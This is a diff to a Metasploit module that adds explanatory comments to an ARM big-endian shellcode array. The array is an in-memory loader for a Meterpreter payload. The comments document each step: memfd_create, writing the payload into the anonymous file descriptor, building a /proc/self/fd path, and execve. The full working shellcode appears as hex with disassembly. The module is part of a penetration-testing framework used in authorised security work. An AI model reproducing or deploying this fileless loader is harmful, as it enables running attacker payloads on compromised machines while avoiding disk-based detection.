@@ -8,6 +8,7 @@
 module Msf::Payload::Linux::Armbe::MeterpreterLoader
   def in_memory_load(payload)
       in_memory_loader = [
+      #memfd_create(null, MFD_CLOEXEC)
       0x0020a0e3, # 0x1000:	mov	r2, #0	0x0020a0e3
       0x04202de5, # 0x1004:	str	r2, [sp, #-4]!	0x04202de5
       0x0d00a0e1, # 0x1008:	mov	r0, sp	0x0d00a0e1
@@ -15,13 +16,21 @@ module Msf::Payload::Linux::Armbe::MeterpreterLoader
       0x8370a0e3, # 0x1010:	mov	r7, #0x83	0x8370a0e3
       0xfe7087e2, # 0x1014:	add	r7, r7, #0xfe	0xfe7087e2
       0x000000ef, # 0x1018:	svc	#0	0x000000ef
+      
+      #save fd to r3    
       0x0030a0e1, # 0x101c:	mov	r3, r0	0x0030a0e1
+      
+      #use branch and branch with linking to get address of payload data
       0x1d0000ea, # 0x1020:	b	#0x109c	0x1d0000ea
       0x0e10a0e1, # 0x1024:	mov	r1, lr	0x0e10a0e1
+      
+      #write(fd,payload, payload_length)
       0x002091e5, # 0x1028:	ldr	r2, [r1]	0x002091e5
       0x261081e2, # 0x102c:	add	r1, r1, #0x26	0x261081e2
       0x0470a0e3, # 0x1030:	mov	r7, #4	0x0470a0e3
       0x000000ef, # 0x1034:	svc	#0	0x000000ef
+      
+      #use custom itoa to convert fd into string and append it to /proc/self/fd/
       0x021041e2, # 0x1038:	sub	r1, r1, #2	0x021041e2
       0x01a0a0e1, # 0x103c:	mov	sl, r1	0x01a0a0e1
       0x0a20a0e3, # 0x1040:	mov	r2, #0xa	0x0a20a0e3
@@ -42,6 +51,7 @@ module Msf::Payload::Linux::Armbe::MeterpreterLoader
       0x01a04ae2, # 0x107c:	sub	sl, sl, #1	0x01a04ae2
       0xf9ffffea, # 0x1080:	b	#0x106c	0xf9ffffea
       0x0da04ae2, # 0x1084:	sub	sl, sl, #0xd	0x0da04ae2
+      #execve(/proc/self/fd/[fd],0,0) 
       0x0a00a0e1, # 0x1088:	mov	r0, sl	0x0a00a0e1
       0x0010a0e3, # 0x108c:	mov	r1, #0	0x0010a0e3
       0x0020a0e3, # 0x1090:	mov	r2, #0	0x0020a0e3
